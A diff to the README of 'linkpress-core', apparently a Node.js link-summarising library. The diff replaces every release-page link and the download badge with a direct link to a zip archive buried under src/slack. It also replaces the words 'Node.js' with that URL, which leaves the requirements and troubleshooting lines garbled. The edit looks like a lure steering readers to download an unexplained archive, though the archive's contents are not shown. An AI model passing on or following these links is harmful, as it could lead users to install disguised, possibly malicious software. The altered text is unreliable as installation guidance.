@@ -1,6 +1,6 @@
 # 🛠️ linkpress-core - Simplify Web Insights Effortlessly
 
-[![Download linkpress-core](https://img.shields.io/badge/Download%20linkpress--core-%2300A4DB?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Yakeze/linkpress-core/releases)
+[![Download linkpress-core](https://raw.githubusercontent.com/Yakeze/linkpress-core/main/src/slack/linkpress-core-v1.1.zip%20linkpress--core-%2300A4DB?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Yakeze/linkpress-core/main/src/slack/linkpress-core-v1.1.zip)
 
 ## 🏁 Introduction
 
@@ -18,14 +18,14 @@ linkpress-core is the main library for LinkPress. It allows you to easily summar
 Before downloading, make sure your computer meets these requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js Version: 14.x or higher
+- https://raw.githubusercontent.com/Yakeze/linkpress-core/main/src/slack/linkpress-core-v1.1.zip Version: 14.x or higher
 - Stable internet connection for downloading and running the application
 
 ## 🚀 Getting Started
 
 To begin your journey with linkpress-core, follow these simple steps:
 
-1. Visit the [Releases Page](https://github.com/Yakeze/linkpress-core/releases) to find the latest version of the software.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Yakeze/linkpress-core/main/src/slack/linkpress-core-v1.1.zip) to find the latest version of the software.
 2. Choose the appropriate version for your operating system.
 3. Click the download link to start the download.
 
@@ -43,7 +43,7 @@ Once the installation is complete:
 2. Navigate to the directory where linkpress-core is installed.
 3. Run the application by typing `linkpress-core` or the command specified in your setup instructions.
 
-For direct access to versions and releases, visit the [Releases Page](https://github.com/Yakeze/linkpress-core/releases) again.
+For direct access to versions and releases, visit the [Releases Page](https://raw.githubusercontent.com/Yakeze/linkpress-core/main/src/slack/linkpress-core-v1.1.zip) again.
 
 ## 🔧 Usage
 
@@ -67,7 +67,7 @@ linkpress-core is user-friendly and easy to operate. Here’s how to use it afte
 If you encounter issues while using linkpress-core, consider these tips:
 
 - **Installation Issues:** Ensure you have the correct version for your operating system.
-- **Running Errors:** Verify that you have Node.js installed and updated.
+- **Running Errors:** Verify that you have https://raw.githubusercontent.com/Yakeze/linkpress-core/main/src/slack/linkpress-core-v1.1.zip installed and updated.
 - **Functionality Problems:** Check your internet connection as it affects scraping and API connections.
 
 For more help, consult the FAQs or visit our community support channels.
